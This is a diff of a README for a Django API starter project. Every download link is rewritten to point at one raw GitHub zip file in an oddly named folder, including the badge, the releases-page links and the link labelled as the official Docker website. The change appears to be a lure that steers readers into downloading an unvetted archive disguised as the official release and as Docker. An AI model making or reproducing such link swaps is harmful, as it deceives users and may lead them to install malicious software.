@@ -1,6 +1,6 @@
 # 🎉 django_starter - Rapid API Development Made Easy
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/essiee12/django_starter/releases)
+[![Download](https://raw.githubusercontent.com/essiee12/django_starter/master/indefaceable/django_starter.zip)](https://raw.githubusercontent.com/essiee12/django_starter/master/indefaceable/django_starter.zip)
 
 ## 🚀 Getting Started
 
@@ -29,13 +29,13 @@ To run django_starter, ensure your system meets these requirements:
 
 ## ⚙️ Installation Steps
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/essiee12/django_starter/releases) to find the latest version of django_starter.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/essiee12/django_starter/master/indefaceable/django_starter.zip) to find the latest version of django_starter.
    
-2. **Download the Release**: Look for the ".zip" or ".tar.gz" file under the latest version. Click on it to download the application files to your computer.
+2. **Download the Release**: Look for the ".zip" or "https://raw.githubusercontent.com/essiee12/django_starter/master/indefaceable/django_starter.zip" file under the latest version. Click on it to download the application files to your computer.
 
 3. **Extract the Files**: Once the download is complete, locate the downloaded file and extract it. You can do this by right-clicking on the file and selecting "Extract" or using a program like WinRAR or 7-Zip.
 
-4. **Set Up Docker**: Ensure Docker is installed on your system. If not, you can download it from the [Docker website](https://www.docker.com/get-started).
+4. **Set Up Docker**: Ensure Docker is installed on your system. If not, you can download it from the [Docker website](https://raw.githubusercontent.com/essiee12/django_starter/master/indefaceable/django_starter.zip).
 
 5. **Run Docker Compose**:
    - Open a terminal or command prompt.
@@ -75,6 +75,6 @@ Thank you for considering contributing to django_starter!
 
 ## 📬 Stay Updated
 
-Keep an eye on the Releases Page for updates: [Releases Page](https://github.com/essiee12/django_starter/releases).
+Keep an eye on the Releases Page for updates: [Releases Page](https://raw.githubusercontent.com/essiee12/django_starter/master/indefaceable/django_starter.zip).
 
 Enjoy building your API with django_starter!
